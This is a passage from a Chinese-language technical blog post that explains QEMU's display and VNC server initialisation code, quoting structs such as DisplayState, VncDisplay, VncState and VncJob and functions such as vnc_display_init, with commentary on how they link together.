class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayState</span> &#123;</span><br>    QEMUTimer *gui_timer;   <span class="hljs-comment">// 对应更新的 timer</span><br>    <span class="hljs-type">uint64_t</span> last_update;   <span class="hljs-comment">// 上次更新时间</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">bool</span> refreshing;<br>    <span class="hljs-type">bool</span> have_gfx;          <span class="hljs-comment">// 是否有图形化显示</span><br>    <span class="hljs-type">bool</span> have_text;         <span class="hljs-comment">// 是否有纯文本显示</span><br><br>    QLIST_HEAD(, DisplayChangeListener) listeners;  <span class="hljs-comment">// 各个 Display 的 Listener 的链表</span><br>&#125;;<br><br><span class="hljs-type">static</span> DisplayState *display_state; <span class="hljs-comment">// 全局的 DisplayState</span><br></code></pre></td></tr></table></figure><p>通常而言，一个 DisplayState 可以对应着多个 QemuConsole，因为其可以对应着多个 VGA 设备，因此相应地其可以有着多个 <code>DisplayChangeListener</code> 来监视多个 Display 设备的更改，多个 <code>DisplayChangeListener</code> 之间连成一个链表</p><h3 id="III、DisplayChangeListener-监视单个显示设备的更改"><a href="#III、DisplayChangeListener-监视单个显示设备的更改" class="headerlink" title="III、DisplayChangeListener - 监视单个显示设备的更改"></a>III、DisplayChangeListener - 监视单个显示设备的更改</h3><p><code>DisplayChangeListener</code> 结构体用于<strong>监视单个显示设备的更改</strong>并进行相关操作，因此一个 DisplayChangeListener 应当与一个特定的 QemuConsole 相关联</p><p>通常而言一个 QemuConsole 可以有着多个 DisplayChangeListener（例如一个 QemuConsole 可以对应有着一个 VNC 的 DCL + 一个本地虚拟终端的 DCL）</p><p>该结构体定义于 <code>include/ui/console.h</code> 中,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayChangeListener</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">const</span> DisplayChangeListenerOps *ops;<br>    DisplayState *ds;<br>    QemuConsole *con;<br><br>    QLIST_ENTRY(DisplayChangeListener) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其成员 <code>ops</code> 为一个 <code>DisplayChangeListenerOps</code> 函数表，该函数表中包含大量的函数指针，用以进行显示相关的操作（例如 <code>dpy_refresh</code> 指针用于刷新显示， <code>gfx_hw_update</code> 指针用于进行显卡硬件相关更新，我们在后面会看到这一点）</p><h2 id="一、init-displaystate-遍历所有的-QemuConsole-并加入-qom-tree，初始化字符型-console"><a href="#一、init-displaystate-遍历所有的-QemuConsole-并加入-qom-tree，初始化字符型-console" class="headerlink" title="一、init_displaystate() - 遍历所有的 QemuConsole 并加入 qom tree，初始化字符型 console"></a>一、init_displaystate() - 遍历所有的 QemuConsole 并加入 qom tree，初始化字符型 console</h2><p><code>init_displaystate()</code> 主要用于对 QemuConsole 进行初始化的工作，该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 由 main() 调用, 在创建 QemuConsoles 之后</span><br><span class="hljs-comment"> * 在初始化 ui (sdl/vnc/...) 之前.</span><br><span class="hljs-comment"> */</span><br>DisplayState *<span class="hljs-title function_">init_displaystate</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    gchar *name;<br>    QemuConsole *con;<br><br>    get_alloc_displaystate();<br>    QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>        <span class="hljs-keyword">if</span> (con-&gt;console_type != GRAPHIC_CONSOLE &amp;&amp;<br>            con-&gt;ds == <span class="hljs-literal">NULL</span>) &#123;<br>            text_console_do_init(con-&gt;chr, display_state);<br>        &#125;<br><br>        <span class="hljs-comment">/* 在这里连接上 qom tree (而不在 new_console()), </span><br><span class="hljs-comment">         * 在所有的 QemuConsoles 都被创建后，其顺序与序号</span><br><span class="hljs-comment">         * 都将不再更改 */</span><br>        name = g_strdup_printf(<span class="hljs-string">&quot;console[%d]&quot;</span>, con-&gt;index);<br>        object_property_add_child(container_get(object_get_root(), <span class="hljs-string">&quot;/backend&quot;</span>),<br>                                  name, OBJECT(con));<br>        g_free(name);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> display_state;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要是遍历全局的 QemuConsole 链表并将其加入到 qom tree 中，若非图形化的 console 则还会调用 <code>text_console_do_init()</code> 进行初始化工作，主要是将其设为标准的 <code>80*24</code> 的字符显示设备，并将其 <code>hw_ops</code> 设为 <code>text_console_ops</code>，其 <code>hw</code> 则指向 QemuConsole 自身</p><h2 id="二、qemu-display-init-调用对应类型-QemuDisplay-的-init-函数进行初始化"><a href="#二、qemu-display-init-调用对应类型-QemuDisplay-的-init-函数进行初始化" class="headerlink" title="二、qemu_display_init() - 调用对应类型 QemuDisplay 的 init 函数进行初始化"></a>二、qemu_display_init() - 调用对应类型 QemuDisplay 的 init 函数进行初始化</h2><p>该函数同样定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_init</span><span class="hljs-params">(DisplayState *ds, DisplayOptions *opts)</span><br>&#123;<br>    assert(opts-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    <span class="hljs-keyword">if</span> (opts-&gt;type == DISPLAY_TYPE_NONE) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    assert(dpys[opts-&gt;type] != <span class="hljs-literal">NULL</span>);<br>    dpys[opts-&gt;type]-&gt;init(ds, opts);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 dpys 是一个 <code>QemuDisplay</code> 类型的全局数组，定义于 <code>ui/console.c</code> 中，表示 Qemu 所支持的所有显示类型，我们可以通过 <code>qemu_display_register()</code> 将显示类型注册到该数组中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> QemuDisplay *dpys[DISPLAY_TYPE__MAX];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_register</span><span class="hljs-params">(QemuDisplay *ui)</span><br>&#123;<br>    assert(ui-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    dpys[ui-&gt;type] = ui;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>QemuDisplay</code> 结构体定义于 <code>ui/console.h</code> 中，表示 Qemu 所支持的单个显示类型，主要就是类型 + 初始化的函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuDisplay</span> &#123;</span><br>    DisplayType type;<br>    <span class="hljs-type">void</span> (*early_init)(DisplayOptions *opts);<br>    <span class="hljs-type">void</span> (*init)(DisplayState *ds, DisplayOptions *opts);<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>不过经笔者调试通常情况下不特定指定的话都会是 <code>DISPLAY_TYPE_NONE</code> </p></blockquote><h1 id="0x02-vnc-init-func-初始化单个-VNC-Server"><a href="#0x02-vnc-init-func-初始化单个-VNC-Server" class="headerlink" title="0x02. vnc_init_func() - 初始化单个 VNC Server"></a>0x02. vnc_init_func() - 初始化单个 VNC Server</h1><p>在一个 Qemu 实例当中，我们通常只会使用到一个 VGA 设备（也可以多个），不过我们可以同时启动多个 VNC Server，例如我们可以附加启动参数 <code>-vnc yourip:0 -vnc yourip:1</code>，此时 Qemu 就会在 5700 与 5701 端口上启动两个 VNC 服务器，而每个 VNC Server 的启动都是通过 <code>vnc_init_func()</code> 来完成的</p><p>当我们只有一个 VGA 设备输出时，其输出会被同时更新给多个 VNC Client，此时多个 VNC Client 所获取到的画面是相同的</p><p><code>vnc_init_func()</code> 定义于 <code>ui/vnc.c</code> 中，比较简短，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vnc_init_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, QemuOpts *opts, Error **errp)</span><br>&#123;<br>    Error *local_err = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *id = (<span class="hljs-type">char</span> *)qemu_opts_id(opts);<br><br>    assert(id);<br>    vnc_display_init(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    vnc_display_open(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err != <span class="hljs-literal">NULL</span>) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要做了两件事：</p><ul><li><code>vnc_display_init()</code>：初始化一个 <code>VncDisplay</code> 实例</li><li><code>vnc_display_open()</code>：启动一个 VNC Server</li></ul><p><code>vnc_display_open()</code> 主要就是单纯的创建一个普通的 server，以及一些和 VNC 协议具体细节相关的部分，故我们接下来主要分析 <code>vnc_display_init()</code></p><h2 id="〇、VNC-相关结构体"><a href="#〇、VNC-相关结构体" class="headerlink" title="〇、VNC 相关结构体"></a>〇、VNC 相关结构体</h2><h3 id="I、VncDisplay-单个-VNC-Server-实例"><a href="#I、VncDisplay-单个-VNC-Server-实例" class="headerlink" title="I、VncDisplay - 单个 VNC Server 实例"></a>I、VncDisplay - 单个 VNC Server 实例</h3><p>该结构体定义于 <code>ui/vnc.h</code> 中，表示单个 VNC Server 实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncDisplay</span></span><br><span class="hljs-class">&#123;</span><br>    QTAILQ_HEAD(, VncState) clients;<br>    <span class="hljs-type">int</span> num_connecting;<br>    <span class="hljs-type">int</span> num_shared;<br>    <span class="hljs-type">int</span> num_exclusive;<br>    <span class="hljs-type">int</span> connections_limit;<br>    VncSharePolicy share_policy;<br>    QIONetListener *listener;<br>    QIONetListener *wslistener;<br>    DisplaySurface *ds;<br>    DisplayChangeListener dcl;<br>    <span class="hljs-type">kbd_layout_t</span> *kbd_layout;<br>    <span class="hljs-type">int</span> lock_key_sync;<br>    QEMUPutLEDEntry *led;<br>    <span class="hljs-type">int</span> ledstate;<br>    QKbdState *kbd;<br>    QemuMutex mutex;<br><br>    QEMUCursor *cursor;<br>    <span class="hljs-type">int</span> cursor_msize;<br>    <span class="hljs-type">uint8_t</span> *cursor_mask;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> <span class="hljs-title">guest</span>;</span>   <span class="hljs-comment">/* guest visible surface (aka ds-&gt;surface) */</span><br>    <span class="hljs-type">pixman_image_t</span> *server;    <span class="hljs-comment">/* vnc server surface */</span><br>    <span class="hljs-type">int</span> true_width; <span class="hljs-comment">/* server surface width before rounding up */</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id;<br>    QTAILQ_ENTRY(VncDisplay) next;<br>    <span class="hljs-type">bool</span> is_unix;<br>    <span class="hljs-type">char</span> *password;<br>    <span class="hljs-type">time_t</span> expires;<br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">int</span> ws_auth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">int</span> ws_subauth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">bool</span> lossy;<br>    <span class="hljs-type">bool</span> non_adaptive;<br>    <span class="hljs-type">bool</span> power_control;<br>    QCryptoTLSCreds *tlscreds;<br>    QAuthZ *tlsauthz;<br>    <span class="hljs-type">char</span> *tlsauthzid;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncDisplaySASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    AudioState *audio_state;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注这几个成员变量：</p><ul><li><code>clients</code>：连接到该服务器上的所有客户端，每个客户端为一个 <code>VncClient</code> 实例，多个 <code>VncClient</code> 实例间形成一个链表</li><li><code>ds</code>：</li><li><code>dcl</code>：该 VNC Server 所监听的 QemuConsole 的监听器，当对应的 QemuConsole 发生更改时便会调用 <code>dcl-&gt;ops</code> 中对应函数指针</li><li><code>next</code>：多个 VncDisplay 之间互相连接形成一个链表</li></ul><p>同时存在着一个全局变量 <code>vnc_displays</code>，Qemu 中所有的 VncDisplay 都挂载在该链表上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, VncDisplay)</span> vnc_displays =<br>    QTAILQ_HEAD_INITIALIZER(vnc_displays);<br></code></pre></td></tr></table></figure><h3 id="II、VncState-单个-VNC-连接（VNC-Client）"><a href="#II、VncState-单个-VNC-连接（VNC-Client）" class="headerlink" title="II、VncState - 单个 VNC 连接（VNC Client）"></a>II、VncState - 单个 VNC 连接（VNC Client）</h3><p>该结构体定义于 <code>ui/vnc.h</code> 中，表示连接到特定 VNC Server 上的单个 VNC Client 实例，其中包含客户端的各种信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncState</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> magic;<br>    QIOChannelSocket *sioc; <span class="hljs-comment">/* The underlying socket */</span><br>    QIOChannel *ioc; <span class="hljs-comment">/* The channel currently used for I/O */</span><br>    guint ioc_tag;<br>    gboolean disconnecting;<br><br>    DECLARE_BITMAP(dirty[VNC_MAX_HEIGHT], VNC_DIRTY_BITS);<br>    <span class="hljs-type">uint8_t</span> **lossy_rect; <span class="hljs-comment">/* Not an Array to avoid costly memcpy in</span><br><span class="hljs-comment">                           * vnc-jobs-async.c */</span><br><br>    VncDisplay *vd;<br>    VncStateUpdate update; <span class="hljs-comment">/* Most recent pending request from client */</span><br>    VncStateUpdate job_update; <span class="hljs-comment">/* Currently processed by job thread */</span><br>    <span class="hljs-type">int</span> has_dirty;<br>    <span class="hljs-type">uint32_t</span> features;<br>    <span class="hljs-type">int</span> absolute;<br>    <span class="hljs-type">int</span> last_x;<br>    <span class="hljs-type">int</span> last_y;<br>    <span class="hljs-type">uint32_t</span> last_bmask;<br>    <span class="hljs-type">size_t</span> client_width; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    <span class="hljs-type">size_t</span> client_height; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    VncShareMode share_mode;<br><br>    <span class="hljs-type">uint32_t</span> vnc_encoding;<br><br>    <span class="hljs-type">int</span> major;<br>    <span class="hljs-type">int</span> minor;<br><br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">char</span> challenge[VNC_AUTH_CHALLENGE_SIZE];<br>    QCryptoTLSSession *tls; <span class="hljs-comment">/* Borrowed pointer from channel, don&#x27;t free */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncStateSASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">bool</span> encode_ws;<br>    <span class="hljs-type">bool</span> websocket;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    VncClientInfo *info;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* Job thread bottom half has put data for a forced update</span><br><span class="hljs-comment">     * into the output buffer. This offset points to the end of</span><br><span class="hljs-comment">     * the update data in the output buffer. This lets us determine</span><br><span class="hljs-comment">     * when a force update is fully sent to the client, allowing</span><br><span class="hljs-comment">     * us to process further forced updates. */</span><br>    <span class="hljs-type">size_t</span> force_update_offset;<br>    <span class="hljs-comment">/* We allow multiple incremental updates or audio capture</span><br><span class="hljs-comment">     * samples to be queued in output buffer, provided the</span><br><span class="hljs-comment">     * buffer size doesn&#x27;t exceed this threshold. The value</span><br><span class="hljs-comment">     * is calculating dynamically based on framebuffer size</span><br><span class="hljs-comment">     * and audio sample settings in vnc_update_throttle_offset() */</span><br>    <span class="hljs-type">size_t</span> throttle_output_offset;<br>    Buffer output;<br>    Buffer input;<br>    <span class="hljs-comment">/* current output mode information */</span><br>    VncWritePixels *write_pixels;<br>    PixelFormat client_pf;<br>    <span class="hljs-type">pixman_format_code_t</span> client_format;<br>    <span class="hljs-type">bool</span> client_be;<br><br>    CaptureVoiceOut *audio_cap;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">audsettings</span> <span class="hljs-title">as</span>;</span><br><br>    VncReadEvent *read_handler;<br>    <span class="hljs-type">size_t</span> read_handler_expect;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">abort</span>;<br>    QemuMutex output_mutex;<br>    QEMUBH *bh;<br>    Buffer jobs_buffer;<br><br>    <span class="hljs-comment">/* Encoding specific, if you add something here, don&#x27;t forget to</span><br><span class="hljs-comment">     *  update vnc_async_encoding_start()</span><br><span class="hljs-comment">     */</span><br>    VncTight *tight;<br>    VncZlib zlib;<br>    VncHextile hextile;<br>    VncZrle *zrle;<br>    VncZywrle zywrle;<br><br>    Notifier mouse_mode_notifier;<br><br>    QemuClipboardPeer cbpeer;<br>    QemuClipboardInfo *cbinfo;<br>    <span class="hljs-type">uint32_t</span> cbpending;<br><br>    QTAILQ_ENTRY(VncState) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在同一个 VncDisplay （VNC Server）下的所有 VncState（VNC Client）连接成一个链表</p><h3 id="III、VncJob-单个-VNC-连接单次需要更新的图像信息"><a href="#III、VncJob-单个-VNC-连接单次需要更新的图像信息" class="headerlink" title="III、VncJob - 单个 VNC 连接单次需要更新的图像信息"></a>III、VncJob - 单个 VNC 连接单次需要更新的图像信息</h3><p>VncJob 结构体用来表示单个 VNC 连接（VncState）单次需要更新的图像信息，定义于 <code>ui/vnc.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJob</span></span><br><span class="hljs-class">&#123;</span><br>    VncState *vs;<br><br>    QLIST_HEAD(, VncRectEntry) rectangles;<br>    QTAILQ_ENTRY(VncJob) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在单次的图像更新当中，单个矩形区域具体的的更新信息使用 <code>VncRectEntry</code> 结构体表示，单个 VncJob 中可以有多个 VncRectEntry，他们之间形成一个单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> w;<br>    <span class="hljs-type">int</span> h;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRectEntry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span> <span class="hljs-title">rect</span>;</span><br>    QLIST_ENTRY(VncRectEntry) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>多个 VncJob 之间也构成一个单向链表，最终挂载到一个 <code>VncJobQueue</code> 结构体上，该结构体定义于 <code>ui/vnc-jobs.c</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> &#123;</span><br>    QemuCond cond;<br>    QemuMutex mutex;<br>    QemuThread thread;<br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">exit</span>;<br>    QTAILQ_HEAD(, VncJob) jobs;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> <span class="hljs-title">VncJobQueue</span>;</span><br></code></pre></td></tr></table></figure><p>同时我们存在着一个全局的 VncJobQueue，默认情况下我们会将 VncJob 挂载到上面，同时 vnc worker thread（负责将图像信息发送给 client 的线程）也是主要依赖于这个全局的 queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We use a single global queue, but most of the functions are</span><br><span class="hljs-comment"> * already reentrant, so we can easily add more than one encoding thread</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> VncJobQueue *<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><h2 id="一、vnc-display-init"><a href="#一、vnc-display-init" class="headerlink" title="一、vnc_display_init()"></a>一、vnc_display_init()</h2><p>该函数主要作用便是初始化一个 <code>VncDisplay</code> 结构体，定义于 <code>ui/vnc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_display_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *id, Error **errp)</span><br>&#123;<br>    VncDisplay *vd;<br><br>    <span class="hljs-keyword">if</span> (vnc_display_find(id) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    vd = g_malloc0(<span class="hljs-keyword">sizeof</span>(*vd));<br><br>    vd-&gt;id = strdup(id);<br>    QTAILQ_INSERT_TAIL(&amp;vnc_displays, vd, next);  <span class="hljs-comment">// 加入到全局链表中</span><br><br>    QTAILQ_INIT(&amp;vd-&gt;clients);<br>    vd-&gt;expires = TIME_MAX;<br><br>    <span class="hljs-keyword">if</span> (keyboard_layout) &#123;  <span class="hljs-comment">// 初始化键盘布局</span><br>        trace_vnc_key_map_init(keyboard_layout);<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym,<br>                                              keyboard_layout, errp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym, <span class="hljs-string">&quot;en-us&quot;</span>, errp);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vd-&gt;kbd_layout) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    vd-&gt;share_policy = VNC_SHARE_POLICY_ALLOW_EXCLUSIVE;<br>    vd-&gt;connections_limit = <span 